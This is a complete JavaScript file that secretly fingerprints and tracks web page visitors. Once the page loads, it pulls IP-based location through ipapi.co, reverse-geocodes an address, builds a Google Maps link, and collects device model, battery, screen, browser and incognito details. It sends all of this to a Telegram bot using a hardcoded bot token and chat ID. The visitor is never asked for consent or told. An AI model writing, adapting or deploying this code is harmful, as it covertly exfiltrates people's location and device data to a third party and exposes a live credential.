// ========== FINGERPRINTING FUNCTIONS ==========

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

async function getIPWithLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const result = await response.json();
        
        return {
            ip: result.ip || 'Unknown',
            city: result.city || 'Unknown',
            region: result.region || 'Unknown',
            country: result.country_name || result.country || 'Unknown',
            isp: result.org || 'Unknown',
            latitude: result.latitude || null,
            longitude: result.longitude || null
        };
    } catch (error) {
        return { ip: 'Unknown', error: error.message };
    }
}

async function getApproximateLocation() {
    return null;
}

async function getInternetInfo() {
    return { 
        connection: { effectiveType: 'unknown', downlink: 'unknown', rtt: 'unknown', quality: 'Unknown' },
        bandwidth: null 
    };
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        userAgent: ua,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        touchSupport: 'ontouchstart' in window,
        vibration: 'vibrate' in navigator,
        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)/i.test(ua),
        isDesktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(ua)
    };
}

async function getGPUInfo() {
    return { renderer: 'Unknown' };
}

function getConnectionInfo() {
    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return {
        effectiveType: conn?.effectiveType || 'unknown',
        downlink: conn?.downlink ? conn.downlink + ' Mbps' : 'unknown',
        rtt: conn?.rtt ? conn.rtt + ' ms' : 'unknown',
        saveData: conn?.saveData || false,
        quality: 'Unknown'
    };
}

function getStorageInfo() {
    return { localStorage: '0 Bytes', sessionStorage: '0 Bytes', cookies: '0 chars' };
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    
    if (/chrome|chromium|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    
    return {
        name: browser,
        version: ua.match(/(?:chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)?.[1] || "Unknown",
        language: navigator.language,
        languages: navigator.languages || []
    };
}

function getPluginsInfo() {
    return { count: 0, plugins: [] };
}

async function getFontsList() {
    return { error: "Font Access API not supported" };
}

function getScreenInfo() {
    return {
        resolution: { width: screen.width, height: screen.height },
        colorDepth: screen.colorDepth + " bits",
        devicePixelRatio: window.devicePixelRatio
    };
}

function getDisplayInfo() {
    return {
        viewport: { width: window.innerWidth, height: window.innerHeight },
        darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches
    };
}

function getPerformanceInfo() {
    return { 
        timing: { total: performance.timing?.loadEventEnd - performance.timing?.navigationStart || 0 },
        memory: null 
    };
}

async function getPreciseLocation() {
    return null;
}

function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Unknown Device";
    
    if (ua.includes('samsung')) {
        if (ua.includes('sm-')) {
            const match = ua.match(/sm-[a-z]\d+/);
            if (match) device = `Samsung ${match[0].toUpperCase()}`;
            else device = "Samsung Galaxy";
        } else if (ua.includes('galaxy')) {
            device = "Samsung Galaxy";
        }
    } else if (ua.includes('redmi') || ua.includes('xiaomi') || ua.includes('mi ')) {
        device = "Xiaomi Phone";
    } else if (ua.includes('pixel')) {
        device = "Google Pixel";
    } else if (ua.includes('iphone')) {
        device = "iPhone";
        if (ua.includes('iphone15')) device = "iPhone 15";
        else if (ua.includes('iphone14')) device = "iPhone 14";
        else if (ua.includes('iphone13')) device = "iPhone 13";
        else if (ua.includes('iphone12')) device = "iPhone 12";
    } else if (ua.includes('ipad')) {
        device = "iPad";
    } else if (ua.includes('oneplus')) {
        device = "OnePlus";
    } else if (ua.includes('huawei') || ua.includes('honor')) {
        device = "Huawei";
    } else if (ua.includes('oppo')) {
        device = "OPPO";
    } else if (ua.includes('vivo')) {
        device = "Vivo";
    } else if (ua.includes('realme')) {
        device = "Realme";
    }
    
    return device;
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging,
                level: Math.round(battery.level * 100) + "%",
                chargingTime: battery.chargingTime === Infinity ? "Not Charging" : 
                             battery.chargingTime === 0 ? "Fully Charged" : 
                             Math.round(battery.chargingTime / 60) + " minutes",
                dischargingTime: battery.dischargingTime === Infinity ? "Unknown" : 
                                Math.round(battery.dischargingTime / 60) + " minutes",
                batterySaving: detectBatterySaving(),
                accurate: true,
                notes: "Accurate reading"
            };
        } catch {
            return { 
                error: "Battery API blocked",
                batterySaving: detectBatterySaving()
            };
        }
    }
    return { 
        error: "Battery API not supported",
        batterySaving: detectBatterySaving()
    };
}

function detectBatterySaving() {
    const methods = [];
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.saveData) {
        methods.push("Data Saver enabled");
    }
    if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
        methods.push("Reduced motion enabled");
    }
    return methods.length > 0 ? methods.join(", ") : "No battery saving detected";
}

async function getGoogleMapsLocation(ipData) {
    if (!ipData.latitude || !ipData.longitude) {
        return "Location coordinates not available";
    }
    
    try {
        const mapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
        let address = "Approximate location";
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${ipData.latitude}&lon=${ipData.longitude}&zoom=10`
            );
            const data = await response.json();
            if (data.display_name) {
                address = data.display_name.split(',').slice(0, 3).join(',');
            }
        } catch {}
        
        return {
            googleMapsLink: mapsLink,
            approximateAddress: address,
            coordinates: `${ipData.latitude}, ${ipData.longitude}`,
            accuracy: "IP-based (usually within 10-50km)"
        };
    } catch (error) {
        return { error: "Failed to get maps location", details: error.message };
    }
}

async function detectIncognito() {
    const tests = [];
    
    const fsTest = await new Promise((resolve) => {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (!fs) {
            resolve("FileSystem API not supported");
            return;
        }
        
        fs(window.TEMPORARY, 100, () => {
            resolve(false);
        }, () => {
            resolve(true);
        });
    });
    
    tests.push({ method: "FileSystem", result: fsTest });
    
    const isIncognito = tests.some(test => test.result === true);
    const uncertain = tests.every(test => 
        test.result === false || 
        typeof test.result === 'string' || 
        test.result === "Unknown"
    );
    
    return {
        isIncognito: isIncognito,
        certainty: uncertain ? "Low" : isIncognito ? "High" : "Medium",
        tests: tests,
        notes: uncertain ? "Browser may be hiding incognito mode" : 
               isIncognito ? "Incognito mode detected" : "Normal browsing mode"
    };
}

async function collectEnhancedData() {
    const data = {
        timestamp: new Date().toISOString(),
        sessionId: generateSessionId(),
        deviceName: getDeviceName(),
        ip: await getIPWithLocation(),
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        approximateLocation: await getApproximateLocation(),
        googleMaps: null,
        internet: await getInternetInfo(),
        device: getDeviceInfo(),
        gpu: await getGPUInfo(),
        battery: await getBatteryInfo(),
        connection: getConnectionInfo(),
        storage: getStorageInfo(),
        browser: getBrowserInfo(),
        plugins: getPluginsInfo(),
        fonts: await getFontsList(),
        incognito: await detectIncognito(),
        screen: getScreenInfo(),
        display: getDisplayInfo(),
        referrer: document.referrer,
        cookies: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        performance: getPerformanceInfo(),
        preciseLocation: null,
        interaction: {
            clicks: 0,
            keypresses: 0,
            scrollDepth: 0,
            timeOnSite: 0
        }
    };
    
    if (data.ip.latitude && data.ip.longitude) {
        data.googleMaps = await getGoogleMapsLocation(data.ip);
    }
    
    return data;
}

async function sendToTelegramBot(message) {
    const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
    const CHAT_ID = '7307197149';
    
    let cleanMessage = message.substring(0, 4096);
    
    try {
        const formData = new URLSearchParams();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', cleanMessage);
        formData.append('parse_mode', '');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData
        });
        
        const result = await response.json();
        console.log("Telegram response:", result);
        return result;
        
    } catch (error) {
        console.error('Network error:', error);
        return { ok: false, error: error.message };
    }
}

async function sendEnhancedDataToTelegram() {
    try {
        const data = await collectEnhancedData();
        
        const telegramMessage = `
🚀 ENHANCED TRACKING REPORT

📅 Time: ${new Date(data.timestamp).toLocaleString()}
🆔 Session: ${data.sessionId}

📱 DEVICE
Name: ${data.deviceName}
Type: ${data.device.isMobile ? 'Mobile' : data.device.isTablet ? 'Tablet' : 'Desktop'}
Platform: ${data.device.platform}
Memory: ${data.device.deviceMemory}GB
Cores: ${data.device.hardwareConcurrency}

📍 LOCATION
IP: ${data.ip.ip || 'Unknown'}
City: ${data.ip.city || 'Unknown'}
Country: ${data.ip.country || 'Unknown'}
ISP: ${data.ip.isp || 'Unknown'}
Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}

🗺️ GOOGLE MAPS
${data.googleMaps ? data.googleMaps.approximateAddress : 'Location not available'}
${data.googleMaps ? data.googleMaps.googleMapsLink : ''}

🌐 INTERNET
Type: ${data.internet.connection.effectiveType || 'unknown'}
Speed: ${data.internet.connection.downlink || 'unknown'}
Latency: ${data.internet.connection.rtt || 'unknown'}

🔋 BATTERY
Level: ${data.battery.level || 'Unknown'}
Charging: ${data.battery.charging ? 'Yes' : 'No'}
Battery Saving: ${data.battery.batterySaving || 'Not detected'}

🌐 BROWSER
${data.browser.name} ${data.browser.version}
Language: ${data.browser.language}
Incognito: ${data.incognito.isIncognito ? 'Yes' : 'No'} (${data.incognito.certainty} certainty)

🖥️ SCREEN
Resolution: ${data.screen.resolution.width}x${data.screen.resolution.height}
Viewport: ${data.display.viewport.width}x${data.display.viewport.height}
Pixel Ratio: ${data.screen.devicePixelRatio}
Dark Mode: ${data.display.darkMode ? 'Enabled' : 'Disabled'}

📊 PERFORMANCE
Load Time: ${data.performance.timing ? Math.round(data.performance.timing.total) + 'ms' : 'N/A'}

🔗 REFERRER
${data.referrer || 'Direct visit'}

👤 USER AGENT:
${data.device.userAgent.substring(0, 200)}...
        `.replace(/\*/g, '').replace(/[_]/g, '');
        
        const result = await sendToTelegramBot(telegramMessage);
        
        if (result && result.ok) {
            console.log("✅ Enhanced data sent to Telegram");
        }
        
        return data;
    } catch (error) {
        console.error("❌ Failed to send data:", error);
        return null;
    }
}

// ========== INITIALIZE ==========
function setupEnhancedTracking() {
    console.log("🔍 Setting up enhanced tracking...");
    
    // Send data when page loads
    setTimeout(async () => {
        const data = await sendEnhancedDataToTelegram();
        if (data) {
            console.log("✅ Enhanced tracking initialized");
        }
    }, 3000);
}

// Wait for DOM to load before running
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        console.log("DOM loaded, initializing tracking...");
        setupEnhancedTracking();
    });
} else {
    console.log("DOM already loaded, initializing tracking...");
    setupEnhancedTracking();
}
